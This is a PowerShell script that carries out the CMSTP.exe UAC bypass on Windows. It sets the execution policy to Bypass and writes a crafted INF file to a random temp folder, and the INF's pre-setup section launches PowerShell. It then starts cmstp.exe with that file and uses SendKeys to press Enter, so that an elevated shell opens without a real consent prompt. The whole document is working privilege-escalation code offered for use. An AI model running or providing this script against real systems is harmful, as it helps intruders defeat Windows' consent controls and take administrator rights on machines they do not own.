# Temporarily set the execution policy to Bypass for the current session
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Step 1: Create a random directory and generate the INF file
Write-Host "[*] Creating a random directory and generating the INF file..."
$randomDir = "$env:temp\" + (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
New-Item -ItemType Directory -Path $randomDir -Force | Out-Null
$infFilePath = "$randomDir\CMSTP.inf"

# INF file content
$infContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

# Write the INF file to the random directory
$infContent | Out-File -FilePath $infFilePath -Encoding ASCII
Write-Host "[+] INF file created at: $infFilePath"

# Step 2: UAC Bypass using SendKeys (Oddvar Moe's method)
Write-Host "[*] Attempting UAC bypass using SendKeys..."

# Function to get the window handle
Function Get-Hwnd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
    )
    Process {
        $ErrorActionPreference = 'Stop'
        Try {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch {
            $hwnd = $null
        }
        $hash = @{
            ProcessName = $ProcessName
            Hwnd        = $hwnd
        }
        New-Object -TypeName PsObject -Property $hash
    }
}

# Function to activate the window
function Set-WindowActive {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
    )
    Process {
        # Dynamically load the correct architecture-specific assembly
        if ([System.IntPtr]::Size -eq 8) {
            # 64-bit
            $memberDefinition = @'
            [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
        } else {
            # 32-bit
            $memberDefinition = @'
            [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
'@
        }

        try {
            Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32 -ErrorAction Stop
            $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
            If ($hwnd) {
                $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
                [User32.Api]::SetForegroundWindow($hwnd)
                [User32.Api]::ShowWindow($hwnd, 5)
            }
            Else {
                [string] $hwnd = 'N/A'
            }
            $hash = @{
                Process = $Name
                Hwnd    = $hwnd
            }
            New-Object -TypeName PsObject -Property $hash
        } catch {
            Write-Host "[!] Failed to load User32.dll functions. Ensure you are running in a compatible environment."
        }
    }
}

# Add Windows Forms for SendKeys
Add-Type -AssemblyName System.Windows.Forms

# Execute the UAC bypass
If (Test-Path $infFilePath) {
    $ps = New-Object System.Diagnostics.ProcessStartInfo "c:\windows\system32\cmstp.exe"
    $ps.Arguments = "/au $infFilePath"
    $ps.UseShellExecute = $false

    # Start cmstp.exe
    [System.Diagnostics.Process]::Start($ps)

    # Wait for cmstp.exe window to activate
    do {
        Start-Sleep -Milliseconds 100
    } until ((Set-WindowActive cmstp).Hwnd -ne 0)

    # Activate the window and send the Enter key
    Set-WindowActive cmstp
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
    Write-Host "[+] UAC bypass attempted. Check for elevated privileges."
}

Start-Sleep -Seconds 2

# Final Message
Write-Host "[!] Script execution complete. Verify UAC bypass."